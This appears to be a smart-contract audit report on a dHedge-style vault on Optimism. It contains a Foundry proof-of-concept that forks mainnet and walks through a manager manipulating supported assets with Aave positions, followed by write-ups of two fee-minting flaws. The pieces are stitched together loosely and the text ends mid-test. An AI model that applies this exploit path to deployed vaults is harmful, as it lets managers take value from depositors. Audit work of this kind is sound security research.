The following PoC is a test that forks the Optimism blockchain and executes the attack on a Vault. The test can be pasted in any Foundry environment and can be run with the command forge test --match-test test_remove_supported. Additionally, you must have the following line in the .env file in order for the test to fork the blockchain:
OPTIMISM_RPC_URL=https://opt-mainnet.g.alchemy.com/v2/{key}
```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.13;
import {Test} from "forge-std/Test.sol";
interface IPoolLogic {
    function execTransaction(address to, bytes calldata data) external returns (bool success);
}
interface IAavePool {
    function deposit(address, uint256, address, uint16) external;
    function borrow(address, uint256, uint256, uint16, address) external;
}
interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
}
interface IAaveLendingPoolAssetGuard {
    function getBalance(address pool, address) external view returns (uint256);
}
interface IPoolManagerLogic {
    struct Asset {
        address asset;
        bool isDeposit;
    }
    function changeAssets(Asset[] calldata _addAssets, address[] calldata _removeAssets) external;
}
contract PoolTest is Test {
    IPoolLogic pool = IPoolLogic(0x749E1d46C83f09534253323A43541A9d2bBD03AF);
    IPoolManagerLogic manager = IPoolManagerLogic(0x950A19078d33f732d35d3630c817532308490cCD);
    address managerAddress = 0xeFc4904b786A3836343A3A504A2A3cb303b77D64;
    IAavePool aaveLendingPool = IAavePool(0x794a61358D6845594F94dc1DB02A252b5b4814aD);
    IAaveLendingPoolAssetGuard aaveGuard = IAaveLendingPoolAssetGuard(0xF7E8a2ED2Dfa2b9AAF76c75f575474c299848577);
    IERC20 WETH = IERC20(0x4200000000000000000000000000000000000006);
    IERC20 USDC = IERC20(0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85);
    IERC20 RETH = IERC20(0x9Bcef72be871e61ED4fBbc7630889beE758eb81D);
    uint256 opFork;
    string OPTIMISM_RPC_URL = vm.envString("OPTIMISM_RPC_URL");
    function setUp() public {
        // Create Optimism fork
        opFork = vm.createSelectFork(OPTIMISM_RPC_URL);
        assertEq(opFork, vm.activeFork());
        vm.rollFork(121348913); // Jun-13-2024 04:36:43 PM +UTC
    }
    function test_remove_supported() public {
        // First, simulate the pool getting 1 WETH
        deal(address(WETH), address(pool), 1e18);
        // Approve 1 WETH to the Aave lending pool
        bytes memory data = abi.encodeWithSelector(WETH.approve.selector, address(aaveLendingPool), 1e18);
        vm.prank(managerAddress);
        pool.execTransaction(address(WETH), data);
        // Supply 1 WETH to the Aave lending pool
        data = abi.encodeWithSelector(aaveLendingPool.deposit.selector, address(WETH), 1e18, address(pool), 0);
        vm.prank(managerAddress);
        pool.execTransaction(address(aaveLendingPool), data);
        // The manager deposits 0.3 rETH on behalf of the pool
        deal(address(RETH), managerAddress, 0.3e18);
        vm.startPrank(managerAddress);
        RETH.approve(address(aaveLendingPool), 0.3e18);
        aaveLendingPool.deposit(address(RETH), 0.3e18, address(pool), 0);
        vm.stopPrank();
        // Borrow some USDC
        data = abi.encodeWithSelector(aaveLendingPool.borrow.selector, address(USDC), 3455.5e6, 2, 0, address(pool));
        vm.prank(managerAddress);
        pool.execTransaction(address(aaveLendingPool), data);
        // Check the Vault's Aave balance is 0 (even though it has some collateral and borrows)
        assertEq(aaveGuard.getBalance(address(pool), address(0)), 0);
        // The manager removes the aaveLendingPool asset from being supported
        address[] memory removeAssets = new address[](1);
        removeAssets[0] = address(aaveLendingPool);
        vm.prank(managerAddress);
        manager.changeAssets(new IPoolManagerLogic.Asset[](0), removeAssets);
    }
}
```
As this test demonstrates, the manager can remove the Aave v3 lending pool from the supported assets even if the Vault has some collateral and borrows. After the test, when some time passes and the ETH price changes, the manager can add back the Aave v3 lending pool as a supported asset to disrupt the Vault's token price and even make some profits.

description:
Manager can mint performance fees even when token price decreases overall. Managers of funds are entitled to 2 types of fees: performance fees and streaming fees.
s/PoolLogic.sol#L694-L720
```solidity
uint256 streamingFee = _tokenSupply.mul(timeChange).mul(_managerFeeNumerator).div(_feeDenominator).div(365 days);
```
Performance fees are more complicated. They are only extracted when the fund performs well and creates a profit for the end user and the manager gets minted a part of it.
```solidity
uint256 currentTokenPrice = _fundValue.mul(10 ** 18).div(_tokenSupply);
if (currentTokenPrice > tokenPriceAtLastFeeMint) {
    available = currentTokenPrice
        .sub(tokenPriceAtLastFeeMint)
        .mul(_tokenSupply)
        .mul(_performanceFeeNumerator)
        .div(_feeDenominator)
        .div(currentTokenPrice);
}
```
These fees are not token transfers, rather they are minted an equivalent number of shares, which the managers can they redeem to get the actual fees in the underlying tokens. Since the fees are distributed in the form of freshly minted shares, minting the manager fee decreases the tokenPrice of the fund. The tokenPrice is the ratio of the fund value to the total number of shares.
```solidity
uint256 currentTokenPrice = _fundValue.mul(10 ** 18).div(_tokenSupply);
```
When fee shares are minted, the _fundValue remains the same, but the _tokenSupply increases, which decreases the tokenPrice. The issue is that in certain situations, managers can collect performance fees even if the token price decreases overall. Lets say a fund has 1000 dollars of tokens and 1000 shares minted. the starting tokenPrice is therefore 1e18. After a year, lets say the fund grew 4%, to a now value of 1040 dollars. Lets assume the streaming fee is 5% and the performance fee is 20%. When calculating the manager fees, the currentTokenPrice is now calculated as 1040 * 1e18 / 1000 = 1.04e18, so a potential profit! So the manager gets minted their performance shares = 40 * 1000 * 20/100 / 1040 = 7.69 shares. Further, they also get minted the streaming fee shares = 1000*5/100 = 50 shares. So the manager gets minted 57.69 shares in total, and the totalSupply of the fund now grows to 1057.69 shares. For the end user, the fund value before the manager fee mint was 1e18. After the fee mint, their fund value is 1040 * 1e18 / 1057.69 = 0.983e18. So for the end users, the tokenValue has actually decreased while they are still charged a performance fee. Furthermore, the tokenPriceAtLastFeeMint is updated only if the tokenprice rises after the mint.
```solidity
if (daoFee > 0) _mint(daoAddress, daoFee);
if (managerFee > 0) _mint(manager(), managerFee);
uint256 currentTokenPrice = _tokenPrice(fundValue, tokenSupply);
if (tokenPriceAtLastFeeMint < currentTokenPrice) {
    tokenPriceAtLastFeeMint = currentTokenPrice;
}
```
In this case, since the token price did not rise, they tokenPriceAtLastFeeMint stays the same (1e18), and the manager will be minted performance fees again if they beat the target of 1e18. This is unfair, since the manager already collected fees based on the assumption that they beat the target already last term with the new price of 1.04e18. So in essence, if streaming fees are higher than the fund growth, the manager can keep beating the same old target over and over and keep collecting performance fees. The end user are not able to capture any part of this growth, and thus keeps seeing their holding values decrease over time even though their manager is collecting performance based bonuses. Manager can beat the same target multiple times and keep collecting performance fees without updating the target. Users dont get a loss, while the manager collects performance fees.

Whenever users deposit tokens into the dHedge Pool, we take a snapshot of the current token price at the last fee mint point. The manager can profit from the increase in token price and the time passed since the last mint time. When users deposit tokens, the manager fee accumulated up to that point is credited to the manager. However, since the last mint token price is incorrectly recorded, the manager can immediately profit again, causing a reduction in token price within the same block. Imagine the total fund is F and the total share is S at this point. Then current token price is F/S. Now, imagine a user deposits tokens worth f into the dHedge Pool. During this deposit, the manager fee ms accumulated up to this point is credited to the manager.

```solidity
function _depositFor(
    address _recipient,
    address _asset,
    uint256 _amount,
    uint256 _cooldown
) private onlyAllowed(_recipient) whenNotFactoryPaused whenNotPaused returns (uint256 liquidityMinted) {
    require(IPoolManagerLogic(poolManagerLogic).isDepositAsset(_asset), "invalid deposit asset");
    ...
}
```

And the current price F/S is recorded as the last fee mint token price.

```solidity
function _mintManagerFee() internal returns (uint256 fundValue) {
    fundValue = IPoolManagerLogic(poolManagerLogic).totalFundValueMutable();
    uint256 tokenSupply = totalSupply();
    uint256 currentTokenPrice = _tokenPrice(fundValue, tokenSupply);
    if (tokenPriceAtLastFeeMint < currentTokenPrice) {
        tokenPriceAtLastFeeMint = currentTokenPrice;
    }
    lastFeeMintTime = block.timestamp;
}
```

Token price will be higher than F/S. If the new share for the depositor is s, then f/s > F/S due to the entry fee.

```solidity
function _depositFor(
    address _recipient,
    address _asset,
    uint256 _amount,
    uint256 _cooldown
) private onlyAllowed(_recipient) whenNotFactoryPaused whenNotPaused returns (uint256 liquidityMinted) {
    (, , uint256 entryFeeNumerator, uint256 denominator) = IPoolManagerLogic(poolManagerLogic).getFee();
    if (totalSupplyBefore > 0) {
        // Accounting for entry fee while calculating liquidity to be minted.
        liquidityMinted = usdAmount.mul(totalSupplyBefore).mul(denominator.sub(entryFeeNumerator)).div(fundValue).div(denominator);
    } else {
        // This is equivalent to doing liquidityMinted = liquidityMinted * (1 - entryFeeNumerator/denominator).
        liquidityMinted = usdAmount.mul(denominator.sub(entryFeeNumerator)).div(denominator);
    }
}
```

As a result, the current token price (F + f) / (S + s + ms) can be larger than F/S. This means if anyone calls the mintManagerFee function again in the same block, the additional manager fee is credited even though no time has passed since the last fee mint.

```solidity
function _availableManagerFee(
    uint256 _fundValue,
    uint256 _tokenSupply,
    uint256 _performanceFeeNumerator,
    uint256 _managerFeeNumerator,
    uint256 _feeDenominator
) internal view returns (uint256 available) {
    if (_tokenSupply == 0 || _fundValue == 0) return 0;
    uint256 currentTokenPrice = _fundValue.mul(10 ** 18).div(_tokenSupply);
    if (currentTokenPrice > tokenPriceAtLastFeeMint) {
        available = currentTokenPrice
            .sub(tokenPriceAtLastFeeMint)
            .mul(_tokenSupply)
            .mul(_performanceFeeNumerator)
            .div(_feeDenominator)
            .div(currentTokenPrice);
    }
}
```

This results in the depositor receiving shares at a token price (F + f) / (S + s + ms) that immediately drops within the same block. The log for the test is as below:

manager share before => 891000000000000  
manager share after => 9710464583763900

Please add below test to the test/unit/PoolLogicTest.ts:

```solidity
it("should account for entry fee when totalSupply is 0", async function () {
    const PoolManagerLogic = await ethers.getContractFactory("PoolManagerLogic");
    const poolManagerLogicAddr = await poolLogicProxy.poolManagerLogic();
    const poolManagerLogicProxy = PoolManagerLogic.attach(poolManagerLogicAddr);
    // refresh timestamp of Chainlink price round data
    await updateChainlinkAggregators(usdcPriceFeed, wethPriceFeed, linkPriceFeed);
    await assetHandler.setChainlinkTimeout(9000000);
